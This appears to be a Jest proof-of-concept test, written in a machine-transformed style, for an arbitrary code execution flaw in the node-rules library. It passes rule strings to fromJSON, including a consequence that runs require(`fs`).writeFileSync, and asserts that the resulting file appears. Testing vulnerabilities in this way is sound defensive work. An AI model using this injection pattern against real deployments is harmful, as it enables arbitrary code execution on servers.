const v19 = () => {
    const v11 = expect.assertions(2);
    v11;
    const fs = require('fs');
    const A = require('node-rules');
    const path = './node-rules';
    file_exist = fs.existsSync(path);
    const v12 = expect(file_exist);
    const v13 = v12.toBe(false);
    v13;
    try {
        var rules = {};
        rules.condition = '{}.__proto__.toString = 222';
        rules.consequence = 'require(`fs`).writeFileSync(`node-rules`,``)';
        var a = new A();
        const v14 = a.fromJSON(rules);
        v14;
    } catch (error) {
    }
    file_exist = fs.existsSync(path);
    const v15 = expect(file_exist);
    const v16 = v15.toBe(true);
    v16;
    const v17 = function (err) {
    };
    const v18 = fs.unlink(path, v17);
    v18;
};
const v20 = test('Arbitrary code execution in node-rules', v19);
v20;